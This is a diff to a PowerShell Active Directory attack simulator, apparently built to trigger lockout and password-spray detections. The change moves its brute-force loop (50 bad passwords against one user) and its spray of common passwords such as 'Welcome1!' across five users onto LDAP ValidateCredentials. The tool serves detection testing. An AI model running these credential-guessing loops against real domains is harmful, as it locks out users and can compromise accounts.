@@ -883,10 +883,14 @@ Function Invoke-AttackAction {
         [string]$attackAction
     )
 
+    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+
     switch ($attackAction) {
 
         #bruteForce - hammers 1 random employee with repeated bad-password auth attempts
         #             intended to trigger account lockout and brute force IRP indicators
+        #             uses LDAP ValidateCredentials to ensure auth events are generated
+        #             regardless of whether the script is running as DA on the DC
         bruteForce {
             $targetUser = $null
             try {
@@ -904,9 +908,17 @@ Function Invoke-AttackAction {
 
             Write-Host "      ! bruteForce: targeting $targetUser with 50 bad-password attempts"
 
+            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
+                [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domainSuffix
+            )
+
             1..50 | ForEach-Object {
-                net use \\$domainSuffix\netlogon /user:"$domainSuffix\$targetUser" "WrongPassword!$_" > $null 2>&1
+                try {
+                    $ctx.ValidateCredentials($targetUser, "WrongPassword!$_") | Out-Null
+                } catch { }
             }
+
+            $ctx.Dispose()
 
             $status = Get-ADUser -Identity $targetUser -Properties LockedOut, BadLogonCount, LastBadPasswordAttempt -ErrorAction SilentlyContinue
             if ($null -ne $status) {
@@ -914,8 +926,10 @@ Function Invoke-AttackAction {
             }
         }
 
-        #passwordSpray - attempts 1 bad password against 5 random employees
+        #passwordSpray - attempts several bad passwords across 5 random employees
         #                intended to trigger password spray IRP indicator
+        #                uses LDAP ValidateCredentials to ensure auth events are generated
+        #                pattern: few passwords, many users (inverse of brute force)
         passwordSpray {
             $targetUsers = $null
             try {
@@ -931,22 +945,25 @@ Function Invoke-AttackAction {
                 return
             }
 
-            $sprayPassword = "Summer2024!"
-            Write-Host "      ! passwordSpray: spraying $($targetUsers.Count) accounts with a single bad password"
+            # A small pool of common-looking passwords to spray - wrong for all accounts
+            $sprayPasswords = @("Summer2024!", "Welcome1!", "Password1!", "Spring2024!")
 
-            foreach ($user in $targetUsers) {
-                Write-Host "        ~ spraying: $($user.SamAccountName)"
-                try {
-                    $secPwd = ConvertTo-SecureString $sprayPassword -AsPlainText -Force
-                    $cred   = New-Object System.Management.Automation.PSCredential ($user.SamAccountName, $secPwd)
-                    New-PSDrive -Name "SprayTmp" -PSProvider FileSystem -Root "\\$domainSuffix\netlogon" `
-                        -Credential $cred -ErrorAction Ignore | Out-Null
-                }
-                catch { }
-                finally {
-                    Remove-PSDrive -Name "SprayTmp" -ErrorAction Ignore
+            Write-Host "      ! passwordSpray: spraying $($targetUsers.Count) accounts with $($sprayPasswords.Count) passwords"
+
+            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
+                [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domainSuffix
+            )
+
+            foreach ($sprayPassword in $sprayPasswords) {
+                foreach ($user in $targetUsers) {
+                    Write-Host "        ~ spraying: $($user.SamAccountName)"
+                    try {
+                        $ctx.ValidateCredentials($user.SamAccountName, $sprayPassword) | Out-Null
+                    } catch { }
                 }
             }
+
+            $ctx.Dispose()
             Write-Host "      ! passwordSpray: complete"
         }
 
